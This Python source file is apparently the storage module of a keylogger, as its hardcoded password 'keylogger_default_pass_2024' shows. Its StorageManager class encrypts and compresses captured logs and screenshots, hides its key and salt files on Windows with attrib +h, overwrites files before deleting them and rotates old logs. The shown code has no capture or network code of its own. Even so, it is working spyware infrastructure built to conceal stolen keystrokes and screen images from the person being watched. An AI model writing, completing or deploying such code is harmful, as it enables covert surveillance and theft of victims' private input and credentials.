import os
import json
import gzip
import base64
from datetime import datetime, timedelta
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import logging

class StorageManager:
    """Handles encrypted storage and retrieval of collected data"""
    
    def __init__(self, config):
        self.config = config
        self.data_dir = config.get_data_directory()
        self.encryption_key = self._get_or_create_key()
        self.cipher = Fernet(self.encryption_key)
        
    def _get_or_create_key(self):
        """Get or create encryption key"""
        key_file = self.data_dir / '.key'
        
        if key_file.exists():
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            # Generate new key from system entropy and a password
            password = b"keylogger_default_pass_2024"  # In production, this should be more secure
            salt = os.urandom(16)
            
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            
            # Store key and salt
            with open(key_file, 'wb') as f:
                f.write(key)
            
            with open(self.data_dir / '.salt', 'wb') as f:
                f.write(salt)
            
            # Hide files on Windows
            try:
                if os.name == 'nt':
                    os.system(f'attrib +h "{key_file}"')
                    os.system(f'attrib +h "{self.data_dir / ".salt"}"')
            except:
                pass
            
            return key
    
    def store_data(self, data):
        """Store JSON data with encryption"""
        try:
            # Create filename with timestamp
            timestamp = datetime.now()
            filename = f"log_{timestamp.strftime('%Y%m%d_%H%M%S')}.dat"
            filepath = self.data_dir / filename
            
            # Serialize data
            json_data = json.dumps(data, ensure_ascii=False).encode('utf-8')
            
            # Compress if enabled
            if self.config.get('storage.compression', True):
                json_data = gzip.compress(json_data)
            
            # Encrypt if enabled
            if self.config.get('storage.encrypt_logs', True):
                json_data = self.cipher.encrypt(json_data)
            
            # Write to file
            with open(filepath, 'wb') as f:
                f.write(json_data)
            
            # Check storage limits
            self._check_storage_limits()
            
        except Exception as e:
            logging.error(f"Failed to store data: {e}")
    
    def store_binary_data(self, binary_data, metadata):
        """Store binary data (like screenshots) with metadata"""
        try:
            timestamp = datetime.now()
            filename = f"bin_{timestamp.strftime('%Y%m%d_%H%M%S')}.dat"
            filepath = self.data_dir / filename
            
            # Create combined data structure
            combined_data = {
                'metadata': metadata,
                'data': base64.b64encode(binary_data).decode('ascii')
            }
            
            # Serialize
            json_data = json.dumps(combined_data).encode('utf-8')
            
            # Compress
            if self.config.get('storage.compression', True):
                json_data = gzip.compress(json_data)
            
            # Encrypt
            if self.config.get('storage.encrypt_logs', True):
                json_data = self.cipher.encrypt(json_data)
            
            # Write to file
            with open(filepath, 'wb') as f:
                f.write(json_data)
            
            self._check_storage_limits()
            
        except Exception as e:
            logging.error(f"Failed to store binary data: {e}")
    
    def get_all_files(self):
        """Get list of all stored data files"""
        return list(self.data_dir.glob('*.dat'))
    
    def read_data(self, filepath):
        """Read and decrypt data from file"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Decrypt if encryption is enabled
            if self.config.get('storage.encrypt_logs', True):
                data = self.cipher.decrypt(data)
            
            # Decompress if compression is enabled
            if self.config.get('storage.compression', True):
                data = gzip.decompress(data)
            
            # Parse JSON
            return json.loads(data.decode('utf-8'))
            
        except Exception as e:
            logging.error(f"Failed to read data from {filepath}: {e}")
            return None
    
    def delete_file(self, filepath):
        """Securely delete a file"""
        try:
            # Overwrite file with random data before deletion (basic secure delete)
            if filepath.exists():
                file_size = filepath.stat().st_size
                with open(filepath, 'wb') as f:
                    f.write(os.urandom(file_size))
                filepath.unlink()
                return True
        except Exception as e:
            logging.error(f"Failed to delete file {filepath}: {e}")
            return False
    
    def _check_storage_limits(self):
        """Check and enforce storage limits"""
        try:
            max_size_mb = self.config.get('storage.max_log_size_mb', 50)
            max_size_bytes = max_size_mb * 1024 * 1024
            
            # Calculate total size
            total_size = sum(f.stat().st_size for f in self.get_all_files())
            
            if total_size > max_size_bytes:
                # Delete oldest files until under limit
                files = sorted(self.get_all_files(), key=lambda f: f.stat().st_mtime)
                
                for file_path in files:
                    if total_size <= max_size_bytes:
                        break
                    
                    file_size = file_path.stat().st_size
                    if self.delete_file(file_path):
                        total_size -= file_size
        
        except Exception as e:
            logging.error(f"Failed to check storage limits: {e}")
    
    def cleanup_old_files(self):
        """Clean up old files based on configuration"""
        try:
            max_age_days = self.config.get('cleanup.max_age_days', 7)
            keep_last_n = self.config.get('cleanup.keep_last_n_files', 2)
            
            files = sorted(self.get_all_files(), key=lambda f: f.stat().st_mtime, reverse=True)
            
            # Keep the last N files regardless of age
            files_to_check = files[keep_last_n:]
            
            # Delete files older than max_age_days
            cutoff_date = datetime.now() - timedelta(days=max_age_days)
            
            for file_path in files_to_check:
                file_time = datetime.fromtimestamp(file_path.stat().st_mtime)
                if file_time < cutoff_date:
                    self.delete_file(file_path)
        
        except Exception as e:
            logging.error(f"Failed to cleanup old files: {e}")